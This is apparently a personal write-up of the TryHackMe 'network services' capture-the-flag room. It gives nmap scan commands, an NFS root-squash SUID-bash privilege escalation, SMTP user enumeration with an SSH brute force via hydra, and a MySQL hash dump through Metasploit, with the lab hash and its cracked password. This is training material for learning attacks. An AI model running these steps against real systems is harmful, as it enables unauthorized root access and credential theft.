# network services 1/2


[link to the room](https://tryhackme.com/room/networkservices)

`export ip=10.10.52.186`


# links
- https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
- https://attack.mitre.org/techniques/T1210/
- https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/

## Recon 

### nmap
command : `nmap -A -T4 -v -p- -oN recon/nmap.nfs $ip`
command: `nmap -A -T4 -v -p- -oN recon/nmap.smtp $ip`
command: `nmap -A -T4 -v -p- -oN recon/nmap.mysql $ip`


## TASK

### NFS
- list the NFS shares : `showmount -e $ip`
- mount the dir : `sudo mount -t nfs $ip:/home /tmp/mount`
- exploit root squash vers 2
```
# target machine
cp /bin/bash .

# attacker machine
chown root:root bash && chmod +s bash

# target machine 
./bash -p
```

### SMTP

- mail name: polosmtp.home
- MTA : Postfix
- username: administrator
- use hydra to brute force ssh : alejandro


### MySQL

- use mysql_hashdump in metasploit we found : carl:*EA031893AA21444B170FC2162A56978B8CEECE18
- crack the password: `john --format=raw-sha1 recon/hash.txt --wordlist=/home/th3m7j0/Personal/tools/wordlists/rockyou.txt` found doggie


